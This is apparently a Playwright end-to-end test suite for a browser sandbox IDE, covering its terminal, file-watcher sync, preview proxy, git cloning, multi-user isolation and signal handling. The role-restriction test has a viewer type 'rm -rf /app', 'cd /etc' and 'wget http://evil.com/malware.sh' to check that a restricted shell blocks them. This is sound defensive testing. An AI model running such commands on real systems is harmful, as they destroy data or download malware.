import { test, expect } from '@playwright/test';

test.describe('Sandbox Terminal E2E Brutal Test Suite', () => {

  test('executes shell commands, detects directory watch sync, and proxies dev server traffic with Ctrl+C teardown', async ({ page, context }) => {
    const timestamp = Date.now();
    const username = `Tester_${timestamp}`;
    const workspaceTitle = `Term_Brutal_WS_${timestamp}`;

    // 1. User logs in
    await page.goto('/login');
    const usernameInput = page.locator('input[placeholder="Username (e.g. alice, bob)"]');
    await usernameInput.waitFor({ state: 'visible', timeout: 15000 });
    await usernameInput.click();
    await usernameInput.fill(username);
    
    const submitBtn = page.locator('button[type="submit"]');
    await expect(submitBtn).toBeEnabled({ timeout: 10000 });
    await submitBtn.click();
    await expect(page).toHaveURL(/\/dashboard/);

    // 2. User creates a workspace
    await page.fill('input[placeholder="e.g. React-Sandbox"]', workspaceTitle);
    await page.click('button:has-text("Create Now")');

    // Wait for redirect to IDE and bootstrap
    await expect(page).toHaveURL(/\/ide\/[a-f0-9-]+/);
    const ideUrl = page.url();
    const workspaceId = ideUrl.split('/ide/')[1].split('/')[0];
    await page.waitForSelector('text=Booting environment...', { state: 'detached', timeout: 35000 });
    await page.waitForSelector('text=Select a file from the explorer to begin.');

    // Locate terminal components
    const terminalTextarea = page.locator('.xterm-helper-textarea');
    const terminalBody = page.locator('.xterm');

    // 3. PTY Interactive Shell Execution
    await expect(terminalBody).toContainText('sandbox:~#', { timeout: 25000 });

    // Wait for the backend watcher's first baseline scan to successfully complete (starts 1.5s post-connect)
    await page.waitForTimeout(3000);

    // Focus and execute a basic echo command
    await terminalTextarea.focus();
    await page.keyboard.type('echo "PTY_TEST_OK"', { delay: 10 });
    await page.keyboard.press('Enter');
    await expect(terminalBody).toContainText('PTY_TEST_OK', { timeout: 5000 });

    // Verify workspace directory via pwd
    await page.keyboard.type('pwd', { delay: 10 });
    await page.keyboard.press('Enter');
    await expect(terminalBody).toContainText(`/workspaces/${workspaceId}`, { timeout: 5000 });

    // 4. Disk-to-Explorer Watcher Sync
    // We write a file to the container disk via shell redirection.
    await page.keyboard.type('echo \'console.log("FROM_SHELL_OK");\' > shell-script.js', { delay: 10 });
    await page.keyboard.press('Enter');

    // The backend watcher should detect the file write and sync it to the explorer.
    const fileSelector = page.locator('.ide-scrollbar').getByText('shell-script.js');
    await expect(fileSelector).toBeVisible({ timeout: 15000 });

    // Click the file in the explorer to load it into Monaco
    await fileSelector.click();
    await page.waitForSelector('.monaco-editor', { timeout: 25000 });
    await expect(page.locator('.monaco-editor')).toContainText('FROM_SHELL_OK', { timeout: 10000 });

    // 5. Dev-Server Execution & Port-Proxy Preview
    // We create 'dev-server.js' inside the workspace using the terminal.
    await terminalTextarea.focus();
    await page.keyboard.type('echo "const http = require(\'http\'); const server = http.createServer((req, res) => { res.writeHead(200, { \'Content-Type\': \'text/plain\' }); res.end(\'HELLO_SANDBOX_DEV_SERVER\'); }); server.listen(3000, \'0.0.0.0\');" > dev-server.js', { delay: 10 });
    await page.keyboard.press('Enter');

    // The backend watcher should detect 'dev-server.js' and sync it to the explorer.
    const devServerSelector = page.locator('.ide-scrollbar').getByText('dev-server.js');
    await expect(devServerSelector).toBeVisible({ timeout: 15000 });

    // Click the file in the explorer to load it into Monaco and verify content
    await devServerSelector.click();
    await page.waitForSelector('.monaco-editor', { timeout: 25000 });
    await expect(page.locator('.monaco-editor')).toContainText('HELLO_SANDBOX_DEV_SERVER', { timeout: 10000 });

    // Launch the dev server via the terminal
    await terminalTextarea.focus();
    // Send standard interrupt to clear line state if any
    await page.keyboard.press('Control+C');
    await page.keyboard.type('\x03');
    await page.waitForTimeout(200);
    await page.keyboard.type('node dev-server.js', { delay: 10 });
    await page.keyboard.press('Enter');
    await expect(terminalBody).toContainText('node dev-server.js', { timeout: 5000 });

    // Click the Preview button in the header and capture the new tab/popup
    const previewPromise = context.waitForEvent('page');
    await page.click('button:has-text("Preview")');
    const previewPage = await previewPromise;

    // Verify the preview page loads and receives text from our running node server
    await previewPage.waitForLoadState('domcontentloaded');
    await expect(previewPage.locator('body')).toContainText('HELLO_SANDBOX_DEV_SERVER', { timeout: 15000 });

    // 6. Process Signal Control (Ctrl+C teardown)
    // Go back to the IDE tab
    await page.bringToFront();
    await terminalTextarea.focus();
    // Send Ctrl+C both synthetically and via raw ETX code (\x03) to kill process
    await page.keyboard.press('Control+C');
    await page.keyboard.type('\x03');
    await page.waitForTimeout(1000);

    // Refresh the preview page
    await previewPage.bringToFront();
    await previewPage.reload();
    await previewPage.waitForLoadState('domcontentloaded');

    // Verify the proxy falls back to the "Preview Server Offline" error page
    await expect(previewPage.locator('body')).toContainText('Preview Server Offline', { timeout: 15000 });

    // Clean up preview page context
    await previewPage.close();
  });

  // ═══════════════════════════════════════════════════════════════════════════════
  // TEST 2: Admin Git Integration & Deep Directory Watcher Sync
  // ═══════════════════════════════════════════════════════════════════════════════
  test('admin successfully clones a remote git repository and verifies recursive file watcher sync', async ({ page }) => {
    const timestamp = Date.now();
    const adminUsername = `Admin_${timestamp}`; 
    const workspaceTitle = `Git_Clone_WS_${timestamp}`;
    const repoUrl = 'https://github.com/AmanKashyapp07/github-test-ci.git';
    const repoName = 'github-test-ci';

    // 1. Admin logs in and creates workspace
    await page.goto('/login');
    const usernameInput = page.locator('input[placeholder="Username (e.g. alice, bob)"]');
    await usernameInput.waitFor({ state: 'visible', timeout: 15000 });
    await usernameInput.click();
    await usernameInput.fill(adminUsername);
    
    const submitBtn = page.locator('button[type="submit"]');
    await expect(submitBtn).toBeEnabled({ timeout: 10000 });
    await submitBtn.click();
    await expect(page).toHaveURL(/\/dashboard/);
    
    await page.fill('input[placeholder="e.g. React-Sandbox"]', workspaceTitle);
    await page.click('button:has-text("Create Now")');

    await expect(page).toHaveURL(/\/ide\/[a-f0-9-]+/);
    await page.waitForSelector('text=Booting environment...', { state: 'detached', timeout: 35000 });

    const terminalTextarea = page.locator('.xterm-helper-textarea');
    const terminalBody = page.locator('.xterm');

    await expect(terminalBody).toContainText('sandbox:~#', { timeout: 25000 });

    // Wait for the backend watcher's first baseline scan to successfully complete
    await page.waitForTimeout(3000);

    // 2. Execute Git Clone
    await terminalTextarea.focus();
    // Send a clear command first to ensure a clean buffer
    await page.keyboard.type('clear', { delay: 10 });
    await page.keyboard.press('Enter');
    
    await page.keyboard.type(`git clone ${repoUrl}`, { delay: 10 });
    await page.keyboard.press('Enter');

    // Wait for the clone to complete (expecting standard git output streams)
    await expect(terminalBody).toContainText(`Cloning into '${repoName}'`, { timeout: 20000 });
    await expect(terminalBody).toContainText('Resolving deltas:', { timeout: 25000 });

    // 3. Verify Recursive File Tree Sync
    // The backend watcher must detect the massive directory drop and sync it to the React UI
    const repoFolder = page.locator('.ide-scrollbar').getByText(repoName);
    await expect(repoFolder).toBeVisible({ timeout: 20000 });

    // Verify terminal CD and list the .git folder directly (to avoid overflow scrolling issue)
    await page.keyboard.type(`cd ${repoName} && ls -d .git`, { delay: 10 });
    await page.keyboard.press('Enter');
    await expect(terminalBody).toContainText('.git', { timeout: 5000 });

    // 4. Validate UI interacts securely with cloned files
    await repoFolder.click();
    await page.waitForTimeout(1000);

    // Click README.md to load into Monaco
    const readmeFile = page.locator('.ide-scrollbar').getByText('README.md', { exact: true }).first();
    if (await readmeFile.isVisible()) {
      await readmeFile.click();
      await page.waitForSelector('.monaco-editor', { timeout: 15000 });
      await expect(page.locator('.monaco-editor')).not.toBeEmpty();
    }
  });

  // ═══════════════════════════════════════════════════════════════════════════════
  // TEST 3: Terminal Buffer Stress Test (Massive Rapid Output)
  // ═══════════════════════════════════════════════════════════════════════════════
  test('xterm.js frontend withstands massive stdout floods without crashing or desyncing', async ({ page }) => {
    const timestamp = Date.now();
    await page.goto('/login');
    const usernameInput = page.locator('input[placeholder="Username (e.g. alice, bob)"]');
    await usernameInput.waitFor({ state: 'visible', timeout: 15000 });
    await usernameInput.click();
    await usernameInput.fill(`Stress_${timestamp}`);
    
    const submitBtn = page.locator('button[type="submit"]');
    await expect(submitBtn).toBeEnabled({ timeout: 10000 });
    await submitBtn.click();
    await expect(page).toHaveURL(/\/dashboard/);

    await page.fill('input[placeholder="e.g. React-Sandbox"]', `Stress_WS_${timestamp}`);
    await page.click('button:has-text("Create Now")');
    await page.waitForSelector('text=Booting environment...', { state: 'detached', timeout: 35000 });

    const terminalTextarea = page.locator('.xterm-helper-textarea');
    const terminalBody = page.locator('.xterm');

    await expect(terminalBody).toContainText('sandbox:~#', { timeout: 25000 });
    
    // Wait for baseline scan
    await page.waitForTimeout(3000);
    
    await terminalTextarea.focus();

    // Fire a bash loop that spits out 2000 lines immediately
    const floodCommand = `for i in $(seq 1 2000); do echo "STRESS_TEST_LINE_$i"; done`;
    await page.keyboard.type(floodCommand, { delay: 5 });
    await page.keyboard.press('Enter');

    // Wait for the final line to guarantee the buffer processed everything
    await expect(terminalBody).toContainText('STRESS_TEST_LINE_2000', { timeout: 20000 });

    // Ensure terminal is still responsive
    await page.keyboard.type('echo "SURVIVED"', { delay: 10 });
    await page.keyboard.press('Enter');
    await expect(terminalBody).toContainText('SURVIVED', { timeout: 5000 });
  });

  // ═══════════════════════════════════════════════════════════════════════════════
  // TEST 4: Interactive Process Handling (Prompts & Backgrounding)
  // ═══════════════════════════════════════════════════════════════════════════════
  test('handles interactive stdin prompts and background process orchestration', async ({ page }) => {
    const timestamp = Date.now();
    await page.goto('/login');
    const usernameInput = page.locator('input[placeholder="Username (e.g. alice, bob)"]');
    await usernameInput.waitFor({ state: 'visible', timeout: 15000 });
    await usernameInput.click();
    await usernameInput.fill(`Interact_${timestamp}`);
    
    const submitBtn = page.locator('button[type="submit"]');
    await expect(submitBtn).toBeEnabled({ timeout: 10000 });
    await submitBtn.click();
    await expect(page).toHaveURL(/\/dashboard/);

    await page.fill('input[placeholder="e.g. React-Sandbox"]', `Interact_WS_${timestamp}`);
    await page.click('button:has-text("Create Now")');
    await page.waitForSelector('text=Booting environment...', { state: 'detached', timeout: 35000 });

    const terminalTextarea = page.locator('.xterm-helper-textarea');
    const terminalBody = page.locator('.xterm');

    await expect(terminalBody).toContainText('sandbox:~#', { timeout: 25000 });

    // Wait for baseline scan
    await page.waitForTimeout(3000);

    await terminalTextarea.focus();

    // 1. Create a script that demands user input
    await page.keyboard.type('echo \'read -p "Enter Magic Word: " word; echo "You said: $word"\' > prompt.sh', { delay: 10 });
    await page.keyboard.press('Enter');
    
    // Run script
    await page.keyboard.type('bash prompt.sh', { delay: 10 });
    await page.keyboard.press('Enter');

    // Assert pauses
    await expect(terminalBody).toContainText('Enter Magic Word:', { timeout: 5000 });

    // Type input
    await page.keyboard.type('PlaywrightRules', { delay: 50 });
    await page.keyboard.press('Enter');

    // Verify stdout
    await expect(terminalBody).toContainText('You said: PlaywrightRules', { timeout: 5000 });

    // 2. Test Background Tasks
    await page.keyboard.type('sleep 100 &', { delay: 10 });
    await page.keyboard.press('Enter');

    // Assert detached PTY unblocked
    await expect(terminalBody).toContainText('sandbox:~#', { timeout: 5000 });
    
    await page.keyboard.type('echo "PTY_UNBLOCKED"', { delay: 10 });
    await page.keyboard.press('Enter');
    await expect(terminalBody).toContainText('PTY_UNBLOCKED', { timeout: 5000 });
  });

});


// ═══════════════════════════════════════════════════════════════════════════════
// BRUTAL TERMINAL TEST SUITE — PART 2
// Covers: Viewer Restrictions, Multi-User Isolation, Environment Variables,
// Signal Handling, Directory Ops, npm install Trigger, Pipe/Redirect,
// Working Directory Persistence, File Deletion Sync, Concurrent Races
// ═══════════════════════════════════════════════════════════════════════════════

test.describe('Terminal Viewer Restrictions & RBAC Enforcement', () => {

  test('viewer gets restricted bash shell and cannot execute dangerous commands', async ({ page, context }) => {
    const browser = context.browser();
    if (!browser) throw new Error('Browser not initialized');

    const timestamp = Date.now();
    const adminName = `Admin_RBAC_${timestamp}`;
    const viewerName = `Viewer_RBAC_${timestamp}`;

    // Admin logs in and creates workspace
    await page.goto('/login');
    const usernameInput = page.locator('input[placeholder="Username (e.g. alice, bob)"]');
    await usernameInput.waitFor({ state: 'visible', timeout: 15000 });
    await usernameInput.click();
    await usernameInput.fill(adminName);
    const submitBtn = page.locator('button[type="submit"]');
    await expect(submitBtn).toBeEnabled({ timeout: 10000 });
    await submitBtn.click();
    await expect(page).toHaveURL(/\/dashboard/);

    await page.fill('input[placeholder="e.g. React-Sandbox"]', `RBAC_WS_${timestamp}`);
    await page.click('button:has-text("Create Now")');
    await expect(page).toHaveURL(/\/ide\/[a-f0-9-]+/);
    const workspaceId = page.url().split('/ide/')[1].split('/')[0];
    await page.waitForSelector('text=Booting environment...', { state: 'detached', timeout: 35000 });
    await page.waitForSelector('text=Select a file from the explorer to begin.');

    // Wait for terminal prompt
    const terminalBody = page.locator('.xterm');
    await expect(terminalBody).toContainText('sandbox:~#', { timeout: 25000 });
    await page.waitForTimeout(3000);

    // Viewer must exist in DB before inviting — register them first
    const viewerContext = await browser.newContext();
    const viewerPage = await viewerContext.newPage();
    await viewerPage.goto('/login');

    const viewerUsernameInput = viewerPage.locator('input[placeholder="Username (e.g. alice, bob)"]');
    await viewerUsernameInput.waitFor({ state: 'visible', timeout: 15000 });
    await viewerUsernameInput.click();
    await viewerUsernameInput.fill(viewerName);
    const viewerSubmitBtn = viewerPage.locator('button[type="submit"]');
    await expect(viewerSubmitBtn).toBeEnabled({ timeout: 10000 });
    await viewerSubmitBtn.click();
    await expect(viewerPage).toHaveURL(/\/dashboard/);

    // Now invite the viewer from the admin page (user exists in DB now)
    await page.click('button:has-text("Share")');
    await page.fill('input[placeholder="Username or Email"]', viewerName);
    await page.selectOption('select', 'viewer');
    await page.click('button:has-text("Invite")');
    await page.waitForTimeout(2000);
    await page.keyboard.press('Escape');

    // Viewer navigates to the workspace
    await viewerPage.goto(`/ide/${workspaceId}`);
    await viewerPage.waitForSelector('text=Booting environment...', { state: 'detached', timeout: 35000 });

    const viewerTerminal = viewerPage.locator('.xterm');
    const viewerTextarea = viewerPage.locator('.xterm-helper-textarea');
    await expect(viewerTerminal).toContainText('sandbox:~#', { timeout: 25000 });
    await viewerPage.waitForTimeout(2000);

    // Viewer tries to write a file — restricted bash should block this
    await viewerTextarea.focus();
    await viewerPage.keyboard.type('echo "HACK" > /tmp/exploit.txt', { delay: 10 });
    await viewerPage.keyboard.press('Enter');
    await viewerPage.waitForTimeout(1000);

    // Viewer tries to run rm — should be blocked by restricted PATH
    await viewerPage.keyboard.type('rm -rf /app', { delay: 10 });
    await viewerPage.keyboard.press('Enter');
    await viewerPage.waitForTimeout(1000);

    // Verify viewer cannot cd out of workspace (restricted bash prevents cd)
    await viewerPage.keyboard.type('cd /etc', { delay: 10 });
    await viewerPage.keyboard.press('Enter');
    await viewerPage.waitForTimeout(500);
    await viewerPage.keyboard.type('pwd', { delay: 10 });
    await viewerPage.keyboard.press('Enter');

    // Restricted bash should prevent directory traversal
    // The viewer should still be in the workspace directory
    await expect(viewerTerminal).toContainText(`/workspaces/${workspaceId}`, { timeout: 5000 });

    // Viewer tries to use wget/curl — should not be available in restricted PATH
    await viewerPage.keyboard.type('wget http://evil.com/malware.sh', { delay: 10 });
    await viewerPage.keyboard.press('Enter');
    await viewerPage.waitForTimeout(500);
    // Should get "command not found" or similar restricted shell error
    await expect(viewerTerminal).toContainText(/not found|restricted|No such file/i, { timeout: 5000 });

    // Meanwhile, admin's terminal should still work perfectly
    const adminTextarea = page.locator('.xterm-helper-textarea');
    const adminTerminal = page.locator('.xterm');
    await adminTextarea.focus();
    await page.keyboard.type('echo "ADMIN_POWER"', { delay: 10 });
    await page.keyboard.press('Enter');
    await expect(adminTerminal).toContainText('ADMIN_POWER', { timeout: 5000 });

    await viewerContext.close();
  });
});


test.describe('Terminal Multi-User Isolation & Concurrent Sessions', () => {

  test('two users in same workspace get independent PTY sessions with isolated shell state', async ({ page, context }) => {
    const browser = context.browser();
    if (!browser) throw new Error('Browser not initialized');

    const timestamp = Date.now();
    const userA = `UserA_Iso_${timestamp}`;
    const userB = `UserB_Iso_${timestamp}`;

    // User A logs in
    await page.goto('/login');
    const usernameInput = page.locator('input[placeholder="Username (e.g. alice, bob)"]');
    await usernameInput.waitFor({ state: 'visible', timeout: 15000 });
    await usernameInput.click();
    await usernameInput.fill(userA);
    const submitBtn = page.locator('button[type="submit"]');
    await expect(submitBtn).toBeEnabled({ timeout: 10000 });
    await submitBtn.click();
    await expect(page).toHaveURL(/\/dashboard/);

    // Create workspace
    await page.fill('input[placeholder="e.g. React-Sandbox"]', `Iso_WS_${timestamp}`);
    await page.click('button:has-text("Create Now")');
    await expect(page).toHaveURL(/\/ide\/[a-f0-9-]+/);
    const workspaceId = page.url().split('/ide/')[1].split('/')[0];
    await page.waitForSelector('text=Booting environment...', { state: 'detached', timeout: 35000 });
    await page.waitForSelector('text=Select a file from the explorer to begin.');

    const terminalA = page.locator('.xterm');
    const textareaA = page.locator('.xterm-helper-textarea');
    await expect(terminalA).toContainText('sandbox:~#', { timeout: 25000 });
    await page.waitForTimeout(3000);

    // Invite User B as editor — must register B first so they exist in DB
    const contextB = await browser.newContext();
    const pageB = await contextB.newPage();
    await pageB.goto('/login');
    const inputB = pageB.locator('input[placeholder="Username (e.g. alice, bob)"]');
    await inputB.waitFor({ state: 'visible', timeout: 15000 });
    await inputB.click();
    await inputB.fill(userB);
    const btnB = pageB.locator('button[type="submit"]');
    await expect(btnB).toBeEnabled({ timeout: 10000 });
    await btnB.click();
    await expect(pageB).toHaveURL(/\/dashboard/);

    // Now invite from admin page
    await page.click('button:has-text("Share")');
    await page.fill('input[placeholder="Username or Email"]', userB);
    await page.selectOption('select', 'editor');
    await page.click('button:has-text("Invite")');
    await page.waitForTimeout(2000);
    await page.keyboard.press('Escape');

    await pageB.goto(`/ide/${workspaceId}`);
    await pageB.waitForSelector('text=Booting environment...', { state: 'detached', timeout: 35000 });

    const terminalB = pageB.locator('.xterm');
    const textareaB = pageB.locator('.xterm-helper-textarea');
    await expect(terminalB).toContainText('sandbox:~#', { timeout: 25000 });
    await pageB.waitForTimeout(2000);

    // User A sets an env variable and changes directory
    await textareaA.focus();
    await page.keyboard.type('export MY_SECRET_A="onlyForA"', { delay: 10 });
    await page.keyboard.press('Enter');
    await page.keyboard.type('mkdir -p subdir_a && cd subdir_a', { delay: 10 });
    await page.keyboard.press('Enter');
    await page.waitForTimeout(500);

    // User B sets a different env variable
    await textareaB.focus();
    await pageB.keyboard.type('export MY_SECRET_B="onlyForB"', { delay: 10 });
    await pageB.keyboard.press('Enter');
    await pageB.waitForTimeout(500);

    // Verify isolation: User A's env should NOT be visible to User B
    await textareaB.focus();
    await pageB.keyboard.type('echo "B_CHECK:$MY_SECRET_A"', { delay: 10 });
    await pageB.keyboard.press('Enter');
    // Should show empty variable — not "onlyForA"
    await expect(terminalB).toContainText('B_CHECK:', { timeout: 5000 });
    // The output should be "B_CHECK:" (empty) not "B_CHECK:onlyForA"

    // User B confirms their own variable works
    await pageB.keyboard.type('echo "B_OWN:$MY_SECRET_B"', { delay: 10 });
    await pageB.keyboard.press('Enter');
    await expect(terminalB).toContainText('B_OWN:onlyForB', { timeout: 5000 });

    // User A's pwd should show subdir_a, User B should still be in root workspace
    await textareaA.focus();
    await page.keyboard.type('pwd', { delay: 10 });
    await page.keyboard.press('Enter');
    await expect(terminalA).toContainText('subdir_a', { timeout: 5000 });

    await textareaB.focus();
    await pageB.keyboard.type('pwd', { delay: 10 });
    await pageB.keyboard.press('Enter');
    await expect(terminalB).toContainText(`/workspaces/${workspaceId}`, { timeout: 5000 });

    // Both create files — verify both appear in explorer (shared filesystem)
    await textareaA.focus();
    await page.keyboard.type('echo "from_A" > ../created_by_a.txt', { delay: 10 });
    await page.keyboard.press('Enter');

    await textareaB.focus();
    await pageB.keyboard.type('echo "from_B" > created_by_b.txt', { delay: 10 });
    await pageB.keyboard.press('Enter');

    // Watcher syncs both files to the explorer
    const fileA = page.locator('.ide-scrollbar').getByText('created_by_a.txt');
    const fileB = page.locator('.ide-scrollbar').getByText('created_by_b.txt');
    await expect(fileA).toBeVisible({ timeout: 15000 });
    await expect(fileB).toBeVisible({ timeout: 15000 });

    await contextB.close();
  });


  test('multiple tabs from same user share one container (reference counting)', async ({ page, context }) => {
    const timestamp = Date.now();
    const username = `MultiTab_${timestamp}`;

    await page.goto('/login');
    const usernameInput = page.locator('input[placeholder="Username (e.g. alice, bob)"]');
    await usernameInput.waitFor({ state: 'visible', timeout: 15000 });
    await usernameInput.click();
    await usernameInput.fill(username);
    const submitBtn = page.locator('button[type="submit"]');
    await expect(submitBtn).toBeEnabled({ timeout: 10000 });
    await submitBtn.click();
    await expect(page).toHaveURL(/\/dashboard/);

    await page.fill('input[placeholder="e.g. React-Sandbox"]', `MultiTab_WS_${timestamp}`);
    await page.click('button:has-text("Create Now")');
    await expect(page).toHaveURL(/\/ide\/[a-f0-9-]+/);
    const workspaceId = page.url().split('/ide/')[1].split('/')[0];
    await page.waitForSelector('text=Booting environment...', { state: 'detached', timeout: 35000 });

    const terminal1 = page.locator('.xterm');
    const textarea1 = page.locator('.xterm-helper-textarea');
    await expect(terminal1).toContainText('sandbox:~#', { timeout: 25000 });
    await page.waitForTimeout(3000);

    // Create a marker file in tab 1
    await textarea1.focus();
    await page.keyboard.type('echo "TAB1_MARKER" > tab1_test.txt', { delay: 10 });
    await page.keyboard.press('Enter');
    await page.waitForTimeout(500);

    // Open second tab (same user, same workspace)
    const page2 = await context.newPage();
    await page2.goto(`/ide/${workspaceId}`);
    await page2.waitForSelector('text=Booting environment...', { state: 'detached', timeout: 35000 });

    const terminal2 = page2.locator('.xterm');
    const textarea2 = page2.locator('.xterm-helper-textarea');
    await expect(terminal2).toContainText('sandbox:~#', { timeout: 25000 });
    await page2.waitForTimeout(2000);

    // Tab 2 should see the file created by Tab 1 (same container filesystem)
    await textarea2.focus();
    await page2.keyboard.type('cat tab1_test.txt', { delay: 10 });
    await page2.keyboard.press('Enter');
    await expect(terminal2).toContainText('TAB1_MARKER', { timeout: 5000 });

    // Close tab 1 — container should remain alive because tab 2 still has a ref
    await page.close();
    await page2.waitForTimeout(1000);

    // Tab 2 should still be functional (container not destroyed)
    await textarea2.focus();
    await page2.keyboard.type('echo "STILL_ALIVE"', { delay: 10 });
    await page2.keyboard.press('Enter');
    await expect(terminal2).toContainText('STILL_ALIVE', { timeout: 5000 });

    await page2.close();
  });
});


test.describe('Terminal Signal Handling & Process Control', () => {

  test('handles SIGTSTP (Ctrl+Z) to background a process and fg to resume it', async ({ page }) => {
    const timestamp = Date.now();
    await page.goto('/login');
    const usernameInput = page.locator('input[placeholder="Username (e.g. alice, bob)"]');
    await usernameInput.waitFor({ state: 'visible', timeout: 15000 });
    await usernameInput.click();
    await usernameInput.fill(`Signal_${timestamp}`);
    const submitBtn = page.locator('button[type="submit"]');
    await expect(submitBtn).toBeEnabled({ timeout: 10000 });
    await submitBtn.click();
    await expect(page).toHaveURL(/\/dashboard/);

    await page.fill('input[placeholder="e.g. React-Sandbox"]', `Signal_WS_${timestamp}`);
    await page.click('button:has-text("Create Now")');
    await page.waitForSelector('text=Booting environment...', { state: 'detached', timeout: 35000 });

    const terminalBody = page.locator('.xterm');
    const terminalTextarea = page.locator('.xterm-helper-textarea');
    await expect(terminalBody).toContainText('sandbox:~#', { timeout: 25000 });
    await page.waitForTimeout(3000);

    // Start a long-running process (sleep)
    await terminalTextarea.focus();
    await page.keyboard.type('sleep 300', { delay: 10 });
    await page.keyboard.press('Enter');
    await page.waitForTimeout(500);

    // Send Ctrl+Z (SIGTSTP) to suspend the process
    await page.keyboard.press('Control+Z');
    await page.waitForTimeout(1000);

    // Terminal should show "Stopped" and return to prompt
    await expect(terminalBody).toContainText(/Stopped|stopped/i, { timeout: 5000 });

    // Verify shell is responsive again
    await page.keyboard.type('echo "SHELL_BACK"', { delay: 10 });
    await page.keyboard.press('Enter');
    await expect(terminalBody).toContainText('SHELL_BACK', { timeout: 5000 });

    // Use `jobs` to verify the backgrounded process
    await page.keyboard.type('jobs', { delay: 10 });
    await page.keyboard.press('Enter');
    await expect(terminalBody).toContainText('sleep', { timeout: 5000 });

    // Resume with fg
    await page.keyboard.type('fg', { delay: 10 });
    await page.keyboard.press('Enter');
    await page.waitForTimeout(500);

    // Kill it with Ctrl+C to regain control
    await page.keyboard.press('Control+C');
    await page.waitForTimeout(500);
    await page.keyboard.type('echo "RECOVERED"', { delay: 10 });
    await page.keyboard.press('Enter');
    await expect(terminalBody).toContainText('RECOVERED', { timeout: 5000 });
  });


  test('handles SIGINT (Ctrl+C) on a node process that traps signals', async ({ page }) => {
    const timestamp = Date.now();
    await page.goto('/login');
    const usernameInput = page.locator('input[placeholder="Username (e.g. alice, bob)"]');
    await usernameInput.waitFor({ state: 'visible', timeout: 15000 });
    await usernameInput.click();
    await usernameInput.fill(`SigTrap_${timestamp}`);
    const submitBtn = page.locator('button[type="submit"]');
    await expect(submitBtn).toBeEnabled({ timeout: 10000 });
    await submitBtn.click();
    await expect(page).toHaveURL(/\/dashboard/);

    await page.fill('input[placeholder="e.g. React-Sandbox"]', `SigTrap_WS_${timestamp}`);
    await page.click('button:has-text("Create Now")');
    await page.waitForSelector('text=Booting environment...', { state: 'detached', timeout: 35000 });

    const terminalBody = page.locator('.xterm');
    const terminalTextarea = page.locator('.xterm-helper-textarea');
    await expect(terminalBody).toContainText('sandbox:~#', { timeout: 25000 });
    await page.waitForTimeout(3000);

    // Create a Node script that traps SIGINT and does graceful shutdown
    // Use multiple echo lines to avoid complex quoting issues in the terminal
    await terminalTextarea.focus();
    await page.keyboard.type('echo "process.on(\'SIGINT\', () => {" > trap.js', { delay: 5 });
    await page.keyboard.press('Enter');
    await page.keyboard.type('echo "  console.log(\'GRACEFUL_SHUTDOWN_CAUGHT\');" >> trap.js', { delay: 5 });
    await page.keyboard.press('Enter');
    await page.keyboard.type('echo "  process.exit(0);" >> trap.js', { delay: 5 });
    await page.keyboard.press('Enter');
    await page.keyboard.type('echo "});" >> trap.js', { delay: 5 });
    await page.keyboard.press('Enter');
    await page.keyboard.type('echo "setInterval(() => console.log(\'HEARTBEAT\'), 500);" >> trap.js', { delay: 5 });
    await page.keyboard.press('Enter');
    await page.waitForTimeout(500);

    // Run it
    await page.keyboard.type('node trap.js', { delay: 10 });
    await page.keyboard.press('Enter');

    // Should see heartbeats
    await expect(terminalBody).toContainText('HEARTBEAT', { timeout: 8000 });

    // Wait a moment to ensure process is running stably
    await page.waitForTimeout(1000);

    // Send SIGINT (Ctrl+C)
    await page.keyboard.press('Control+C');

    // The trap handler should fire, printing our graceful shutdown message
    await expect(terminalBody).toContainText('GRACEFUL_SHUTDOWN_CAUGHT', { timeout: 8000 });

    // Shell should be back
    await page.waitForTimeout(500);
    await page.keyboard.type('echo "POST_TRAP_OK"', { delay: 10 });
    await page.keyboard.press('Enter');
    await expect(terminalBody).toContainText('POST_TRAP_OK', { timeout: 5000 });
  });
});


test.describe('Terminal File System Operations & Reverse Sync', () => {

  test('directory creation, nested files, and deletion all sync back to the explorer', async ({ page }) => {
    const timestamp = Date.now();
    await page.goto('/login');
    const usernameInput = page.locator('input[placeholder="Username (e.g. alice, bob)"]');
    await usernameInput.waitFor({ state: 'visible', timeout: 15000 });
    await usernameInput.click();
    await usernameInput.fill(`DirSync_${timestamp}`);
    const submitBtn = page.locator('button[type="submit"]');
    await expect(submitBtn).toBeEnabled({ timeout: 10000 });
    await submitBtn.click();
    await expect(page).toHaveURL(/\/dashboard/);

    await page.fill('input[placeholder="e.g. React-Sandbox"]', `DirSync_WS_${timestamp}`);
    await page.click('button:has-text("Create Now")');
    await page.waitForSelector('text=Booting environment...', { state: 'detached', timeout: 35000 });
    await page.waitForSelector('text=Select a file from the explorer to begin.');

    const terminalBody = page.locator('.xterm');
    const terminalTextarea = page.locator('.xterm-helper-textarea');
    await expect(terminalBody).toContainText('sandbox:~#', { timeout: 25000 });
    await page.waitForTimeout(3000);

    await terminalTextarea.focus();

    // Create a deeply nested directory structure
    await page.keyboard.type('mkdir -p src/components/ui', { delay: 10 });
    await page.keyboard.press('Enter');
    await page.waitForTimeout(500);

    // Create files at different levels
    await page.keyboard.type('echo "export default App;" > src/App.tsx', { delay: 10 });
    await page.keyboard.press('Enter');
    await page.keyboard.type('echo "export const Button = () => {};" > src/components/ui/Button.tsx', { delay: 10 });
    await page.keyboard.press('Enter');
    await page.keyboard.type('echo "body { margin: 0; }" > src/styles.css', { delay: 10 });
    await page.keyboard.press('Enter');

    // Wait for watcher to detect and sync all files
    const srcFolder = page.locator('.ide-scrollbar').getByText('src');
    await expect(srcFolder).toBeVisible({ timeout: 15000 });

    // Expand and verify nested structure appears
    await srcFolder.click();
    await page.waitForTimeout(1000);
    const appFile = page.locator('.ide-scrollbar').getByText('App.tsx');
    await expect(appFile).toBeVisible({ timeout: 10000 });

    // Click to load in editor and verify content
    await appFile.click();
    await page.waitForSelector('.monaco-editor', { timeout: 25000 });
    await expect(page.locator('.monaco-editor')).toContainText('export default App', { timeout: 10000 });

    // Now DELETE a file that is NOT open in the editor (watcher only deletes files without active Yjs docs)
    await terminalTextarea.focus();
    await page.keyboard.type('rm src/styles.css', { delay: 10 });
    await page.keyboard.press('Enter');

    // Watcher should detect deletion of styles.css (no active Yjs doc for it)
    const stylesFile = page.locator('.ide-scrollbar').getByText('styles.css');
    await expect(stylesFile).not.toBeVisible({ timeout: 20000 });

    // Create a file with special characters in name
    await page.keyboard.type('echo "config" > src/my-config.test.ts', { delay: 10 });
    await page.keyboard.press('Enter');
    const configFile = page.locator('.ide-scrollbar').getByText('my-config.test.ts');
    await expect(configFile).toBeVisible({ timeout: 15000 });

    // Rename via mv (rename App.tsx which is still on disk)
